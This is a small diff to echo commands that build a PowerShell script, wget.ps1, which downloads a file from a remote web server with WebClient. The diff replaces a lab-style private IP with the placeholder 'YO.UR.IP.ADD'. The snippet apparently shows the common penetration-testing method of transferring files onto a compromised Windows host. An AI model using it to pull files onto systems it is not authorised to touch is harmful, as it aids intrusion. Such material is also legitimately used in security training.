@@ -1,5 +1,5 @@
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >> wget.ps1
-echo $url = "http://10.11.0.138/test.txt" >> wget.ps1
+echo $url = "http://YO.UR.IP.ADD/test.txt" >> wget.ps1
 echo $file = "testps.txt" >> wget.ps1
 echo $webclient.DownloadFile($url, $file) >> wget.ps1
